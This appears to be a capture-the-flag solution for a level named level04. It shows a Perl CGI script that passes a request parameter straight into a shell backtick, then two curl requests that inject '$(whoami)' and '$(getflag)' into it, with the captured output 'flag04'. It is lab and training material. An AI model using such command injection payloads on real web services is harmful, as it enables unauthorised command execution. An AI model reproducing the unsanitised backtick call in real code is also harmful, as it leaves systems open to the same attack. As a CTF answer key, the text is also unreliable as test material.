# Solution

level04.pl

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

```bash
$>curl -d 'x=$(whoami)' http://localhost:4747/level04.pl
flag04
$>curl -d 'x=$(getflag)' http://localhost:4747/level04.pl
...
```
